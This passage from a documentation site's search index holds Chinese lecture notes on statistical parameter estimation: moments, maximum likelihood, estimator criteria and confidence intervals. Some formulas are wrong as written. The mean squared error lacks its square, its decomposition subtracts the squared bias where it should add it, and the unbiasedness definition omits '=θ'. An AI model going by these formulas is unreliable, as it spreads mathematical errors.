A\\vec{1}_n,A(\\sigma^2I_n)A^\\mathsf{T})=N((\\sqrt{n}\\mu,\\mathbf{0}_{n-1})^\\mathsf{T},\\sigma^2 I_n)\\)\u3002</p> <p>\u6ce8\uff1a\u8fd9\u4e2a\u7ed3\u8bba\u76f4\u63a5\u6839\u636e\u6b63\u6001\u5206\u5e03\u7684\u7ebf\u6027\u6027\u5f97\u5230\uff0c\u63a8\u5e7f\u53ef\u4ee5\u5f97\u5230\u5982\u4e0b\u7ed3\u8bba\uff1a</p> <p>\u8bbe \\(X\\sim N_p(\\mu, \\Sigma)\\)\uff0c\\(B\\) \u4e3a\u4efb\u610f\u7684 \\(m\\times p\\) \u7684\u5e38\u6570\u9635\uff0c\\(Y=BX\\)\uff0c\u968f\u5373\u6709\uff1a</p> \\[ Y\\sim N_m(B\\mu,B\\Sigma B^\\mathsf{T}) \\] <p>\u7531\u534f\u5dee\u9635\u8bf4\u660e \\(\\vec{Y}\\)\u5404\u5206\u91cf\u72ec\u7acb\uff0c\u7136\u540e\uff1a</p> \\[ \\begin{aligned} \\dfrac{(n-1)S^2}{\\sigma^2} &amp;=\\dfrac{1}{\\sigma^2}\\sum_{i=1}^{n}(X_i-\\bar{X})^2\\\\ &amp;=\\dfrac{1}{\\sigma^2}\\left(\\sum_{i=1}^{n}X_i^2-n\\bar{X}^2\\right)\\\\ &amp;=\\dfrac{1}{\\sigma^2}\\left(\\sum_{i=1}^{n}Y_i^2-Y_1^2\\right)\\\\ &amp;=\\sum_{i=2}^{n}\\left(\\dfrac{Y_i}{\\sigma}\\right)^2\\\\ &amp;\\sim\\chi^2(n-1) \\end{aligned} \\] <p>Q.E.D.</p> <p>(3) \u7531 (2) \u5f97\u77e5\uff1a\\(\\bar{X}=\\dfrac{1}{\\sqrt{n}}Y_1,S^2=\\dfrac{1}{n-1}\\sum_{i=2}^{n}Y_i^2\\)\uff0c\u800c \\(Y\\) \u5404\u5206\u91cf\u72ec\u7acb\uff0c\u81ea\u7136\u6709 \\(\\bar{X}\\) \u548c \\(S^2\\) \u72ec\u7acb\u3002Q.E.D.</p>"},{"location":"in_class_learning/semester_3/probability_theory/Ch-7-%E5%8F%82%E6%95%B0%E4%BC%B0%E8%AE%A1/","title":"Ch.7 \u53c2\u6570\u4f30\u8ba1","text":"<p>\u53c2\u6570\u4f30\u8ba1\u4e0e\u68c0\u9a8c\u5047\u8bbe\u662f\u7edf\u8ba1\u63a8\u65ad\u7684\u4e24\u4e2a\u4e3b\u8981\u5185\u5bb9\uff0c\u53c2\u6570\u4f30\u8ba1\u7684\u4e3b\u8981\u4efb\u52a1\u662f\u5728\u5df2\u77e5\u603b\u4f53\u7684\u60c5\u51b5\u4e0b\uff0c\u5229\u7528\u6837\u672c\u6784\u9020\u5408\u7406\u7684\u7edf\u8ba1\u91cf\u5bf9\u672a\u77e5\u53c2\u6570\u8fdb\u884c\u7edf\u8ba1\u3002\u5bf9\u5e94\u975e\u53c2\u6570\u4f30\u8ba1\uff0c\u4e03\u4e0d\u77e5\u603b\u4f53\uff0c\u53ea\u77e5\u9053\u603b\u4f53\u7684\u67d0\u4e9b\u7279\u5f81\u3002\u53c2\u6570\u4f30\u8ba1\u53ef\u5206\u4e3a\u70b9\u4f30\u8ba1\u4e0e\u533a\u95f4\u4f30\u8ba1\u3002</p> <p>\u70b9\u4f30\u8ba1\u7684\u4f30\u8ba1\u91cf\u548c\u4f30\u8ba1\u503c\uff1a\u8bbe\u603b\u4f53\u7684\u5206\u5e03\u4e3a \\(F(x;\\theta)\\)\uff0c\u5176\u4e2d \\(\\theta=(\\theta_1, \\theta_2, \\cdots, \\theta_k)^\\mathsf{T}\\)\uff0c\u6839\u636e\u6837\u672c \\(X_1,X_2,\\cdots, X_n\\)\uff0c\u6784\u9020\u7edf\u8ba1\u91cf \\(\\hat{\\theta}(X_1, X_2,\\cdots, X_n)\\) \u4f5c\u4e3a \\(\\theta\\) \u7684\u4f30\u8ba1\uff0c\u79f0\u4e3a \\(\\theta\\) \u7684\u4f30\u8ba1\u91cf\u3002\u82e5 \\(x_1,x_2,\\cdots, x_n\\) \u662f\u4e00\u7ec4\u6837\u672c\u89c2\u5bdf\u503c\uff0c\u4ee3\u5165 \\(\\hat{\\theta}\\) \u540e\u5f97\u5230\u7684\u5177\u4f53\u503c\u79f0\u4e3a \\(\\theta\\) \u7684\u4f30\u8ba1\u503c\uff0c\u5982\u6b64\u4f30\u8ba1\u79f0\u4e3a\u70b9\u4f30\u8ba1\u3002</p>"},{"location":"in_class_learning/semester_3/probability_theory/Ch-7-%E5%8F%82%E6%95%B0%E4%BC%B0%E8%AE%A1/#the-method-of-moments","title":"\u77e9\u4f30\u8ba1\uff08the method of moments\uff09","text":"<p>\u77e9\u4f30\u8ba1\uff1a\u7528\u6837\u672c\u77e9\u4f5c\u4e3a\u603b\u4f53\u77e9\u7684\u4f30\u8ba1\u3002\u8bbe\u53c2\u6570 \\(\\theta=(\\theta_1, \\theta_2, \\cdots, \\theta_k)^\\mathsf{T}\\) \u53ef\u4f5c\u4e3a\u603b\u4f53\u77e9 \\(\\mu_1,\\cdots,\\mu_k\\) \u7684\u51fd\u6570 \\(\\theta_i=h_i(\\mu_1,\\cdots,\\mu_k),i=1,\\cdots,k\\)\uff0c\u7528\u6837\u672c\u77e9 \\(A_1,\\cdots,A_k\\) \u4ee3\u66ff\u603b\u4f53\u77e9 \\(\\mu_1,\\cdots,\\mu_k\\) \u6240\u5f97\u7684\u4f30\u8ba1\u91cf\u5c31\u662f\u77e9\u4f30\u8ba1\u91cf\u3002</p> <p>\u5177\u4f53\u6b65\u9aa4\u5982\u4e0b\uff1a</p> <ol> <li>\u6c42\u603b\u4f53\u7684\u5404\u9636\u539f\u70b9\u77e9 \\(\\mu_i=g_i(\\theta_1,\\cdots,\\theta_k)\\)</li> <li>\u89e3\u4e0a\u8ff0\u65b9\u7a0b\u7ec4\u5f97\u5230 \\(\\theta_i=h_i(\\mu_1,\\cdots,\\mu_k)\\)</li> <li>\u7528\u6837\u672c\u77e9\u4ee3\u66ff\u603b\u4f53\u77e9\u5f97\u5230\u77e9\u4f30\u8ba1 \\(\\hat{\\theta}_i=h_i(A_1,\\cdots,A_k)\\).</li> </ol> <p>\u76f8\u5408\u6027/\u4e00\u81f4\u6027\uff08consistency\uff09\uff1a\u5f53\u6837\u672c\u5bb9\u91cf\u5145\u5206\u5927\u65f6\uff0c\u4f30\u8ba1\u91cf\u53ef\u4ee5\u4ee5\u4efb\u4e00\u7684\u7cbe\u786e\u7a0b\u5ea6\u903c\u8fd1\u88ab\u4f30\u8ba1\u53c2\u6570\u7684\u771f\u503c\u3002\u76f8\u5408\u6027\u65f6\u4e00\u4e2a\u4f30\u8ba1\u91cf\u5e94\u5177\u5907\u7684\u6700\u57fa\u672c\u6027\u8d28\uff0c\u76f8\u5408\u4f30\u8ba1\u4e5f\u79f0\u4e3a\u4e00\u81f4\u4f30\u8ba1\u3001\u76f8\u5bb9\u4f30\u8ba1\u3002\u6309\u6536\u655b\u610f\u4e49\u4e0d\u540c\uff0c\u76f8\u5408\u4f30\u8ba1\u6709\u5f31\u76f8\u5408\u4f30\u8ba1\u3001\u5f3a\u76f8\u5408\u4f30\u8ba1\u7b49\u7b49\u3002</p> <p>\u77e9\u4f30\u8ba1\u7684\u76f8\u5408\u6027\uff1a\u82e5 \\(h\\) \u4e3a\u5df2\u77e5\u7684\u8fde\u7eed\u51fd\u6570\uff0c\u53ef\u4ee5\u8bc1\u660e \\(h(A_1,\\cdots,A_k)\\xrightarrow{P}h(\\mu_1,\\cdots,\\mu_k)\\).</p> <p>\u77e9\u4f30\u8ba1\u662f\u4e00\u79cd\u76f4\u89c2\u3001\u7b80\u4fbf\u7684\u4f30\u8ba1\u65b9\u6cd5\uff0c\u9002\u7528\u8303\u56f4\u5f88\u5e7f\uff0c\u4e14\u4e0d\u9700\u8981\u77e5\u9053\u603b\u4f53\u5206\u5e03\u7684\u5177\u4f53\u7c7b\u578b\uff0c\u53ea\u9700\u8981\u77e5\u9053\u603b\u4f53\u77e9\u7684\u8868\u8fbe\u5f0f\u5373\u53ef\u3002\u56e0\u672a\u5145\u5206\u5229\u7528\u4fe1\u606f\uff0c\u77e9\u4f30\u8ba1\u5f80\u5f80\u7cbe\u5ea6\u4e0d\u9ad8\u3002</p> <p>\u4e60\u9898\uff1a</p> <ol> <li>\u603b\u4f53 \\(X\\sim N(\\mu,\\sigma^2)\\)\uff0c\\(\\mu\\) \u548c \\(\\sigma^2\\) \u7684\u77e9\u4f30\u8ba1\u5206\u522b\u4e3a\u6837\u672c\u5747\u503c \\(\\bar{X}\\) \u548c\u6837\u672c\u4e8c\u9636\u4e2d\u5fc3\u77e9 \\(S^{*2}\\).</li> <li>\u603b\u4f53 \\(X\\sim U[\\theta_1,\\theta_2]\\)\uff0c\\(\\theta_2\\) \u548c \\(\\theta_1\\) \u7684\u77e9\u4f30\u8ba1\u4e3a \\(\\bar{X}\\pm\\sqrt{3}S^*\\).</li> <li>\u603b\u4f53 \\(X\\sim \\mathrm{Poisson}(\\lambda)\\)\uff0c\\(\\lambda\\) \u7684\u77e9\u4f30\u8ba1\u4e3a \\(\\bar{X}\\).\uff08\u4e8b\u5b9e\u4e0a\u6837\u672c\u4e8c\u9636\u4e2d\u5fc3\u77e9\u4e5f\u662f\u4e00\u4e2a\u77e9\u4f30\u8ba1\uff0c\u4f46\u662f\u4e00\u822c\u53d6\u9636\u6570\u8f83\u4f4e\u7684\uff09\u3002</li> <li>\u4e8c\u7ef4\u603b\u4f53 \\((X,Y)\\) \u7684\u76f8\u5173\u7cfb\u6570 \\(\\rho\\) \u7684\u77e9\u4f30\u8ba1\u662f\u6837\u672c\u76f8\u5173\u7cfb\u6570 \\(r\\).</li> </ol>"},{"location":"in_class_learning/semester_3/probability_theory/Ch-7-%E5%8F%82%E6%95%B0%E4%BC%B0%E8%AE%A1/#mle-maximum-likelihood-estimation","title":"\u6781\u5927\u4f3c\u7136\u4f30\u8ba1\uff08MLE, maximum likelihood estimation\uff09","text":"<p>\u6781\u5927\u4f3c\u7136\u4f30\u8ba1\u7531 Fisher \u4e8e 1922 \u5e74\u7ed9\u51fa\uff0c\u662f\u7edf\u8ba1\u5b66\u4e2d\u6781\u4e3a\u91cd\u8981\u7684\u65b9\u6cd5\u3002\u6781\u5927\u4f3c\u7136\u4f30\u8ba1\u53ef\u4f5c\u5982\u4e0b\u76f4\u89c2\u7406\u89e3\uff0c\u6709\u4e24\u4e2a\u5c04\u624b\uff0c\u4e00\u4e2a\u6280\u827a\u7cbe\u6e5b\uff0c\u4e00\u4e2a\u53ea\u662f\u4e00\u822c\u6c34\u5e73\uff0c\u73b0\u5728\u6211\u4eec\u53d1\u73b0\u6709\u4e00\u67aa\u5c04\u4e2d\u4e86\u9776\u5fc3\uff0c\u90a3\u4e48\u8fd9\u67aa\u53ef\u80fd\u662f\u8c01\u5c04\u7684\uff1f\u6211\u4eec\u5e94\u5f53\u9009\u62e9\u6280\u827a\u7cbe\u6e5b\u7684\u90a3\u4e2a\uff0c\u56e0\u4e3a\u5176\u5c04\u4e2d\u9776\u5fc3\u7684\u6982\u7387\u66f4\u5927\u3002</p> <p>\u6781\u5927\u4f3c\u7136\u4f30\u8ba1\u4e5f\u79f0\u4e3a\u6700\u5927\u4f3c\u7136\u4f30\u8ba1\uff0c\u6211\u56fd\u65e9\u671f\u7814\u7a76\u3001\u6559\u80b2\u501f\u9274\u82cf\u8054\u3001\u65e5\u672c\uff0c\u5c06\u5176\u7ffb\u8bd1\u4e3a\u6781\u5927\u4f3c\u7136\u4f30\u8ba1\u3002\u7136\u800c\u6781\u5927\u4f3c\u7136\u4f30\u8ba1\u53d6\u7684\u662f\u6700\u5927\u503c\u70b9\uff0c\u5728\u5f53\u4e0b\uff0c\u6700\u5927\u3001\u6781\u5927\u5df2\u4e25\u683c\u533a\u5206\uff0c\u5206\u522b\u4ee3\u8868\u5168\u5c40\u6700\u5927\u548c\u5c40\u90e8\u6700\u5927\u7684\u4e24\u79cd\u542b\u4e49\uff0c\u4e0b\u6587\u5c06\u91c7\u7528\u6700\u5927\u4f3c\u7136\u4f30\u8ba1\u4e00\u8bcd\u53ca\u5176\u884d\u751f\u8bcd\u3002</p> <p>\u5728\u5df2\u6709\u6837\u672c\u7684\u57fa\u7840\u4e0a\uff0c\u6211\u4eec\u5e94\u9009\u62e9\u53c2\u6570\u7684\u4e00\u4e2a\u5408\u7406\u7684\u4f30\u8ba1\u503c\u4f7f\u5f97\u53c2\u6570\u5728\u53d6\u5f97\u8be5\u4f30\u8ba1\u503c\u65f6\u6837\u672c\u53d1\u751f\u7684\u53ef\u80fd\u6027\u8fbe\u5230\u6700\u5927\u3002</p> <p>\u82e5\u8bbe\u603b\u4f53 \\(X\\) \u4e3a\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf\uff0c\u5176\u5bc6\u5ea6\u51fd\u6570\u4e3a \\(p(x;\\theta),\\theta\\in\\Theta\\)\uff0c\\(\\theta\\) \u4e3a\u5f85\u4f30\u53c2\u6570\uff0c\\(\\Theta\\) \u4e3a\u5176\u53d6\u503c\u8303\u56f4\u3002\\((X_1,\\cdots, X_n)\\) \u4e3a\u6765\u81ea\u603b\u4f53 \\(X\\) \u7684\u6837\u672c\uff0c\u56e0\u72ec\u7acb\u6027\uff0c\\((X_1,\\cdots, X_n)\\) \u7684\u6982\u7387\u5bc6\u5ea6\u4e3a \\(\\prod_{i=1}^{n}p(x_i;\\theta)\\)\uff0c\u53c8\u8bbe \\((x_1,\\cdots, x_n)\\) \u4e3a\u6837\u672c\u7684\u4e00\u7ec4\u89c2\u5bdf\u503c\uff0c\u90a3\u4e48\u6837\u672c\u843d\u5728\u70b9 \\((x_1,\\cdots,x_n)\\) \u7684\u9886\u57df\u5185\u7684\u6982\u7387\u5c31\u8fd1\u4f3c\u4e3a \\(\\prod_{i=1}^{n}p(x_i;\\theta)\\mathrm{d}x_i\\).</p> <p>\u82e5\u8bbe\u603b\u4f53 \\(X\\) \u4e3a\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf\uff0c\u5176\u6982\u7387\u51fd\u6570\u4e3a \\(p(x;\\theta),\\theta\\in\\Theta\\). \u8bbe \\((X_1,\\cdots, X_n)\\) \u4e3a\u6765\u81ea\u603b\u4f53 \\(X\\) \u7684\u6837\u672c\uff0c\u90a3\u4e48\u5176\u8054\u5408\u6982\u7387\u4ecd\u7136\u4e3a \\(\\prod_{i=1}^{n}p(x_i;\\theta)\\).</p> <p>\u65e0\u8bba \\(X\\) \u5982\u4f55\uff0c\u8bb0 \\(L(x_1,\\cdots,x_n;\\theta)=\\prod_{i=1}^{n}p(x_i;\\theta)\\)</p> <p>\u5f53\u6837\u672c\u503c \\((x_1,\\cdots,x_n)\\) \u53d6\u5b9a\u65f6\uff0c\u4e0a\u5f0f\u4e3a\u5173\u4e8e \\(\\theta\\) \u7684\u51fd\u6570\uff0c\u6b64\u65f6\u79f0\u4e3a\u4f3c\u7136\u51fd\u6570\u3002\u6ee1\u8db3\u4e0b\u5f0f\u7684\u6700\u5927\u503c\u70b9 \\(\\hat{\\theta}(x_1,\\cdots,x_n)\\) \u79f0\u4e3a \\(\\theta\\) \u7684\u6700\u5927\u4f3c\u7136\u4f30\u8ba1\u503c\uff0c\u63a8\u5e7f\u4e4b\u5f97\u5230 \\(\\hat{\\theta}(X_1,\\cdots, X_n)\\)\uff0c\u79f0\u4e3a\u6700\u5927\u4f3c\u7136\u4f30\u8ba1\u91cf\u3002</p> \\[ L(x_1,\\cdots,x_n;\\theta)=\\max_{\\theta\\in\\Theta} L(x_1,\\cdots,x_n;\\theta) \\] <p>\u5728\u5b9e\u8df5\u4e2d\u5f80\u5f80\u5c06\u6c42\u79ef\u7684 \\(L(\\theta)\\) \u901a\u8fc7\u5355\u8c03\u7684\u5bf9\u6570\u51fd\u6570\u8f6c\u5316\u4e3a\u6c42\u548c\u7684\u5bf9\u6570\u4f3c\u7136\u51fd\u6570 \\(\\ln L(\\theta)\\)\uff0c\u663e\u7136\u4e8c\u8005\u6700\u5927\u503c\u70b9\u76f8\u540c\uff0c\u4e8e\u662f\u79f0\u4e0b\u5f0f\u4e3a\u4f3c\u7136\u65b9\u7a0b\uff08\u7ec4\uff09\uff0c\u89e3\u4e4b\u5f80\u5f80\u5f97\u5230\u6700\u5927\u4f3c\u7136\u4f30\u8ba1\u3002</p> \\[ \\sum_{i=1}^{n}\\dfrac{\\partial \\ln p(x_i;\\theta)}{\\partial \\theta}=0 \\] <p>\u6700\u5927\u4f3c\u7136\u4f30\u8ba1\u7684\u4e0d\u53d8\u6027\u539f\u5219\uff1a\u8bbe \\(\\hat{\\theta}\\) \u662f\u53c2\u6570 \\(\\theta\\) \u7684\u6700\u5927\u4f3c\u7136\u4f30\u8ba1\uff0c\\(\\varphi(\\theta)\\) \u6709\u5355\u503c\u53cd\u51fd\u6570\uff0c\u5219 \\(\\varphi(\\hat{\\theta)}\\) \u662f \\(\\varphi(\\theta)\\) \u7684\u6700\u5927\u4f3c\u7136\u4f30\u8ba1\uff0c\u4e5f\u5373</p> \\[ \\widehat{\\varphi(\\theta)}=\\varphi(\\hat{\\theta}) \\] <p>\u4e60\u9898\uff1a</p> <ol> <li>\u603b\u4f53 \\(X\\sim B(1,p)\\)\uff0c\\(p\\) \u7684\u6700\u5927\u4f3c\u7136\u4f30\u8ba1\u662f\u6837\u672c\u5747\u503c \\(\\bar{X}\\).</li> <li>\u603b\u4f53 \\(X\\sim \\mathrm{Poisson}(\\lambda)\\)\uff0c\\(\\lambda\\) \u7684\u6700\u5927\u4f3c\u7136\u4f30\u8ba1\u662f\u6837\u672c\u5747\u503c \\(\\bar{X}\\).</li> <li>\u603b\u4f53 \\(X\\sim N(\\mu,\\sigma^2)\\)\uff0c\\(\\mu\\) \u548c \\(\\sigma^2\\) \u7684\u6700\u5927\u4f3c\u7136\u4f30\u8ba1\u5206\u522b\u4e3a \\(\\bar{X}\\) \u548c \\(S^{*2}\\).</li> <li>\u603b\u4f53 \\(X\\sim U[\\theta_1,\\theta_2]\\)\uff0c\\theta_1,\\theta_2 \u7684\u6700\u5927\u4f3c\u7136\u4f30\u8ba1\u5206\u522b\u4e3a \\(\\min(x_1,\\cdots, x_n),\\max\\{x_1,\\cdots,x_n\\}\\)\uff08\u63d0\u793a\uff1a\u6b64\u65f6\u4f3c\u7136\u51fd\u6570\u4e0d\u8fde\u7eed\uff0c\u9700\u6309\u5b9a\u4e49\u6c42\u5f97\uff09</li> </ol>"},{"location":"in_class_learning/semester_3/probability_theory/Ch-7-%E5%8F%82%E6%95%B0%E4%BC%B0%E8%AE%A1/#_1","title":"\u4f30\u8ba1\u91cf\u7684\u8bc4\u4ef7\u6807\u51c6","text":"<p>\u6b64\u5904\u4ec5\u4ecb\u7ecd\u4e09\u79cd\u6807\u51c6\uff1a\u65e0\u504f\u6027\uff08unbiasedness\uff09\u3001\u5747\u65b9\u8bef\u5dee\u51c6\u5219\uff08MMSE, minimum mean square error\uff09\u3001\u4e00\u81f4\u6027\uff08consistency\uff09\u3002</p> <p>\u7ffb\u8bd1\u95ee\u9898\uff1a\u5747\u65b9\u8bef\u5dee\u51c6\u5219\u901a\u8bd1\u5b9e\u672a\u786e\u5b9a\uff0c\u4ee5\u4e0b\u79f0\u547c\u5176\u4e3a\u66f4\u6613\u7406\u89e3\u7684\u300c\u6700\u5c0f\u5747\u65b9\u8bef\u5dee\u51c6\u5219\u300d\u3002\u300c\u76f8\u5408\u6027\u300d\u548c\u300c\u4e00\u81f4\u6027\u300d\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u6027\u8d28\uff0c\u82f1\u6587\u4e5f\u90fd\u662f\u300cconsistency\u300d\uff0c\u4e00\u4e2a\u8bcd\u4e3a\u4ec0\u4e48\u8981\u641e\u4e24\u79cd\u7ffb\u8bd1\u5462\uff1f\u9274\u4e8e\u4e00\u81f4\u6027\u7528\u5230\u7684\u4f9d\u6982\u7387\u6536\u655b\u548c\u4e00\u81f4\u6536\u655b\u5b9e\u9645\u4e0a\u56e0\u540e\u63a5\u8bcd\u6c47\u4e0d\u540c\u4e0d\u4f1a\u6df7\u6dc6\uff0c\u6545\u800c\u4ee5\u4e0b\u4ecd\u7136\u79f0\u547c\u4e3a\u4e00\u81f4\u6027\uff0c\u5b9e\u5728\u6709\u533a\u5206\u4e4b\u5fc5\u8981\u65f6\uff0c\u4f1a\u6539\u7528\u76f8\u5408\u6027\uff0c\u5e76\u8bf4\u660e\u548c\u4e00\u81f4\u6027\u540c\u4e00\u3002</p> <p>\u65e0\u504f\u6027\uff1a\u8bbe \\(\\hat{\\theta}(X_1,\\cdots, X_n)\\) \u4e3a\u53c2\u6570 \\(\\theta\\) \u7684\u4e00\u4e2a\u4f30\u8ba1\u91cf\uff0c\\(\\Theta\\) \u4e3a\u5176\u53d6\u503c\u8303\u56f4\uff0c\u82e5\u6709</p> \\[ \\mathrm{E}(\\hat{\\theta}(X_1,\\cdots,X_n)),\\quad\\forall \\theta\\in\\Theta \\] <p>\u5219\u79f0 \\(\\hat{\\theta}\\)  \u662f \\(\\theta\\) \u7684\u65e0\u504f\u4f30\u8ba1\u91cf\u3002</p> <p>\u6e10\u8fdb\u65e0\u504f\u4f30\u8ba1\uff1a\u6211\u4eec\u77e5\u9053\u65b9\u5dee\u5b58\u5728\u4e14\u6709\u9650\u65f6\uff0c\u6837\u672c\u65b9\u5dee \\(S^2\\) \u662f\u603b\u4f53\u65b9\u5dee \\(\\sigma^2\\) \u7684\u65e0\u504f\u4f30\u8ba1\uff0c\u4f46\u662f\u6837\u672c\u4e8c\u9636\u4e2d\u5fc3\u77e9\u4e0d\u662f\u3002\u7136\u800c \\(\\mathrm{E}(S^{*2})=\\dfrac{n-1}{n}\\sigma^2\\to\\sigma^2,n\\to\\infty\\)\uff0c\u8fd9\u5b9e\u9645\u4e0a\u4e5f\u5f88\u597d\uff0c\u79f0\u5176\u4e3a\u6e10\u8fdb\u65e0\u504f\u4f30\u8ba1\uff1a\u4f30\u8ba1\u4e0d\u662f\u65e0\u504f\u4f30\u8ba1\uff0c\u4f46\u662f\u5728\u6837\u672c\u5bb9\u91cf\u8d8b\u4e8e\u65e0\u7a77\u5927\u65f6\uff0c\u671f\u671b\u6781\u9650\u7b49\u4e8e\u53c2\u6570\u3002</p> <p>\u6700\u5c0f\u5747\u65b9\u8bef\u5dee\u51c6\u5219\uff1a\u6211\u4eec\u5f53\u7136\u5e0c\u671b\u4f30\u8ba1\u548c\u771f\u503c\u8d8a\u63a5\u8fd1\u8d8a\u597d\uff0c\u6211\u4eec\u8bb0 \\(M(\\hat{\\theta},\\theta)=\\mathrm{E}(\\hat{\\theta}-\\theta)\\) \u4e3a\u5747\u65b9\u8bef\u5dee\uff0c\u5e94\u6700\u5c0f\u5316\u3002</p> <p>\u5e38\u89c1\u53d8\u5f62\uff1a\\(M(\\hat{\\theta},\\theta)=\\mathrm{Var}(\\hat{\\theta})-(\\mathrm{E}(\\hat{\\theta})-\\theta)^2\\). \u6545\u800c\u5f53\u4f30\u8ba1\u4e3a\u65e0\u504f\u4f30\u8ba1\u65f6\uff0c\u5747\u65b9\u8bef\u5dee\u53d8\u4e3a\u7edf\u8ba1\u91cf\u65b9\u5dee\u3002</p> <p>\u4e00\u81f4\u6027\uff1a\u82e5\u6709 \\(\\hat{\\theta}\\xrightarrow{P}\\theta\\)\uff0c\u5219\u79f0 \\(\\hat{\\theta}\\) \u4e3a \\(\\theta\\) \u7684\u4e00\u81f4\u4f30\u8ba1\u91cf\u3002</p>"},{"location":"in_class_learning/semester_3/probability_theory/Ch-7-%E5%8F%82%E6%95%B0%E4%BC%B0%E8%AE%A1/#_2","title":"\u533a\u95f4\u4f30\u8ba1","text":"<p>\u524d\u9762\u8ba8\u8bba\u7684 \\(\\hat{\\theta}\\) \u90fd\u662f\u4e00\u4e2a\u503c\uff0c\u79f0\u4e3a\u70b9\u4f30\u8ba1\u3002\u73b0\u5728\u6211\u4eec\u8981\u6c42\u7ed9\u51fa\u4e00\u4e2a\u533a\u95f4 \\((\\hat{\\theta}_1,\\hat{\\theta}_2)\\) \u6765\u4f30\u8ba1\u53c2\u6570 \\(\\theta\\) \u7684\u8303\u56f4\uff0c\u8fd9\u79f0\u4e3a\u533a\u95f4\u4f30\u8ba1\u3002\u6211\u4eec\u5e94\u5f53\u7ed9\u51fa \\(\\theta\\) \u843d\u5728\u8fd9\u4e2a\u533a\u95f4\u7684\u6982\u7387\u6709\u591a\u5927\uff0c\u8fd9\u5c31\u5f15\u51fa\u4e86\u7f6e\u4fe1\u533a\u95f4\u548c\u7f6e\u4fe1\u5ea6\u7684\u6982\u5ff5\u3002</p> <p>\u5b9a\u4e49\uff1a\u8bbe \\(\\theta\\) \u662f\u603b\u4f53 \\(X\\) \u7684\u672a\u77e5\u53c2\u6570\uff0c\\(X_1,\\cdots, X_n\\) \u662f\u6765\u81ea\u603b\u4f53 \\(X\\) \u7684\u6837\u672c\u3002\u82e5\u5bf9\u4e8e\u4e8b\u5148\u7ed9\u5b9a\u7684\u5e38\u6570 \\(\\alpha(0&lt;\\alpha&lt;1)\\)\uff0c\u5b58\u5728\u4e24\u4e2a\u7edf\u8ba1\u91cf \\(\\hat{\\theta}_1(X_1,\\cdots, X_n)\\) \u548c \\(\\hat{\\theta}_2(X_1,\\cdots, X_n)\\) \u6709\uff1a\\(\\mathrm{Pr}(\\hat{\\theta}_1&lt;\\theta&lt;\\hat{\\theta})=1-\\alpha\\)\uff0c\u5219\u79f0 \\((\\hat{\\theta}_1,\\hat{\\theta}_2)\\) \u662f \\(\\theta\\) \u7684\u7f6e\u4fe1\u5ea6\u4e3a \\(1-\\alpha\\) \u7684\u7f6e\u4fe1\u533a\u95f4\uff0c\\(\\hat{\\theta}_1,\\hat{\\theta}_2\\) \u5206\u522b\u6210\u4e3a\u7f6e\u4fe1\u4e0b\u9650\u548c\u7f6e\u4fe1\u4e0a\u9650\uff0c\\(1-\\alpha\\) \u79f0\u4e3a\u7f6e\u4fe1\u5ea6\u6216\u7f6e\u4fe1\u7cfb\u6570\u3002\u7279\u522b\u5730\uff0c\u5f53 \\(\\hat{\\theta}_1\\equiv -\\infty\\) \u6216 \\(\\hat{\\theta}_2\\equiv \\infty\\) \u65f6\uff0c\u79f0\u7f6e\u4fe1\u533a\u95f4\u4e3a\u5355\u4fa7\u7f6e\u4fe1\u533a\u95f4\uff0c\u5bf9\u5e94\u7f6e\u4fe1\u4e0a/\u4e0b\u9650\u79f0\u4e3a\u5355\u4fa7\u7f6e\u4fe1\u4e0a/\u4e0b\u9650\u3002</p> <p>\u663e\u7136\uff0c\u7f6e\u4fe1\u533a\u95f4\u7684\u957f\u5ea6\u53ef\u4ee5\u770b\u4f5c\u4f30\u8ba1\u7684\u7cbe\u5ea6\uff0c\u800c\u7cbe\u5ea6\u5f80\u5f80\u548c\u7f6e\u4fe1\u5ea6\u4e0d\u53ef\u517c\u5f97\uff0c\u5728\u5b9e\u9645\u4e2d\uff0c\u6211\u4eec\u901a\u5e38\u5728\u4fdd\u8bc1\u7f6e\u4fe1\u5ea6\u7684\u524d\u63d0\u4e0b\u5c3d\u53ef\u80fd\u63d0\u9ad8\u7cbe\u5ea6\u3002</p> <p>\u6c42\u533a\u95f4\u4f30\u8ba1\u7684\u4e00\u822c\u65b9\u6cd5\uff08\u67a2\u8f74\u53d8\u91cf\u6cd5\uff09\uff1a</p> <p>\u200b   (1) \u5148\u627e\u4e00\u4e2a\u6837\u672c\u51fd\u6570 \\(U(X_1,\\cdots,X_n;\\theta)\\)\uff0c\u5176\u5305\u542b\u5f85\u4f30\u53c2\u6570 \\(\\theta\\)\uff0c\u800c\u4e0d\u5305\u542b\u5176\u4ed6\u672a\u77e5\u53c2\u6570\uff0c\u4e14 \\(U\\) \u7684\u5206\u5e03\u5df2\u77e5\uff0c\u4e0d\u4f9d\u8d56\u4e8e\u4efb\u4f55\u672a\u77e5\u53c2\u6570\uff0c\u8fd9\u6837\u7684\u53c2\u6570\u79f0\u4e3a\u67a2\u8f74\u53d8\u91cf\uff0c\u56e0\u542b\u6709\u672a\u77e5\u53c2\u6570 \\(\\theta\\) \u6545\u800c\u4e0d\u662f\u7edf\u8ba1\u91cf\u3002</p> <p>\u200b   (2) \u5bf9\u5b9e\u73b0\u7ed9\u5b9a\u7684\u7f6e\u4fe1\u5ea6\u4e3a \\(1-\\alpha\\)\uff0c\u6839\u636e \\(U\\) \u7684\u5206\u5e03\u627e\u5230\u4e24\u4e2a\u5e38\u6570 \\(a,b\\) \u4f7f\u5f97\uff1a</p> \\[ \\mathrm{Pr}(a&lt;U&lt;b)=1-\\alpha \\] <p>\u200b   (3) \u5229\u7528\u4e0d\u7b49\u5f0f\u53d8\u5f62\uff0c\u901a\u8fc7 \\(a&lt;U&lt;b\\) \u89e3\u5f97 \\(\\hat{\\theta}_1&lt;\\theta&lt;\\hat{\\theta}_2\\)\uff0c\\((\\hat{\\theta}_1,\\hat{\\theta}_2)\\)  \u5373\u4e3a\u6240\u6c42\u3002</p> <p>\u4e60\u9898\uff1a</p> <ul> <li>\u603b\u4f53 \\(X\\sim N(\\mu, \\sigma^2)\\)\uff0c\u5747\u503c\u7684\u7f6e\u4fe1\u533a\u95f4\u3002\uff08\u5df2\u77e5\u603b\u4f53\u65b9\u5dee\u53d6\u67a2\u8f74\u53d8\u91cf \\(U=\\dfrac{\\bar{X}-\\mu}{\\sigma/\\sqrt{n}}\\sim 